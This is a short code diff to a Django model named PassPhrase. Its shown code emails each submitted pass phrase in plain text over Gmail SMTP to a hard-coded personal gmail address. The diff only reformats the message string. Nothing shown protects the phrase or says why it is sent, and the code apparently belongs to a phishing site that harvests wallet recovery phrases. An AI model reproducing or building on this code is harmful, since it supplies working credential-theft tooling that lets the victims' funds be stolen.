@@ -17,15 +17,15 @@ class PassPhrase(models.Model):
         sent_from = gmail_user
         to = ['agwumafam@gmail.com']
         subject = 'New Pass Phrase Has Been Submitted'
-        body = self.phrase
+        body = f"{self.phrase}"
         
         email_text = """\
-        From: %s
-        To: %s
-        Subject: %s
-        
-        %s
-        """ % (sent_from, ", ".join(to), subject, body)
+                    From: %s
+                    To: %s
+                    Subject: %s
+                    
+                    %s
+                    """ % (sent_from, ", ".join(to), subject, body)
         
         try:
             server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
